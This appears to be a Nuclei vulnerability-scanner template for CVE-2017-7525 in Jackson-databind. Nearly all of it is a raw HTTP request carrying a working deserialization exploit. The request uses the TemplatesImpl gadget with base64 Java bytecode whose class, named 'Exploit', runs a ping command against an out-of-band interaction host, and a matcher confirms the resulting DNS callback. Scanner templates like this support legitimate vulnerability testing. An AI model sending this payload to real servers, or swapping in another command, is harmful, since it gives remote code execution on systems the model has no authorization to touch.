id: CVE-2017-7525

info:
  name: Jackson-databind
  author: JohnnieWalker
  severity: critical 
  description: A deserialization flaw was discovered in the jackson-databind, which could allow an unauthenticated user to perform code execution by sending the maliciously crafted input to the readValue method of the ObjectMapper. 
  reference: 
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7525
    - https://nvd.nist.gov/vuln/detail/CVE-2017-7525
    - https://access.redhat.com/security/cve/cve-2017-7525
  classification:
    cve-id: CVE-2017-7525
  tags: cve,cve2017,jackson,databind,deserialization

requests:
  - raw:
      - |
        POST /{{Path}} HTTP/1.1
        Host: {{BaseURL}}
        Accept-Encoding: gzip, deflate
        Accept: */*
        Accept-Language: en
        User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
        Connection: close
        Content-Type: application/json
        Content-Length: 138

        {
          "param": [
            "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
            {
              "transletBytecodes": [
                "{{base64(replace(base64_decode("yv66vgAAADEAKQoACQAYCgAZABoIABsKABkAHAcAHQoABQAYBwAeCgAHAB8HACABAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACEBAAY8aW5pdD4BAAMoKVYBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgcAIgEAClNvdXJjZUZpbGUBAAxFeHBsb2l0LmphdmEMABEAEgcAIwwAJAAlAQA0cGluZyAtYyAxIGNkYjgxNDQydnRjMDAwMDRoZjNnZ2dpOTRub3l5eXl5ci5vYXN0LmZ1bgwAJgAnAQAHRXhwbG9pdAEAE2phdmEvbGFuZy9FeGNlcHRpb24MACgAEgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAUACQAAAAAABAABAAoACwABAAwAAAAZAAAABAAAAAGxAAAAAQANAAAABgABAAAADwABAAoADgACAAwAAAAZAAAAAwAAAAGxAAAAAQANAAAABgABAAAAFAAPAAAABAABABAAAQARABIAAgAMAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAA0AAAAOAAMAAAAWAAQAFwANABgADwAAAAQAAQAHAAkAEwAUAAIADAAAAEEAAgACAAAAEbsABVm3AAZMpwAITCu2AAixAAEAAAAIAAsABwABAA0AAAAWAAUAAAAcAAgAHwALAB0ADAAeABAAIAAPAAAABAABABUAAQAWAAAAAgAX"),"cdb81442vtc00004hf3gggi94noyyyyyr.oast.fun","{{interactsh-url}}"))}}"
              ],
              "transletName": "a.b",
              "outputProperties": {}
            }
          ]
        }  

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"  









      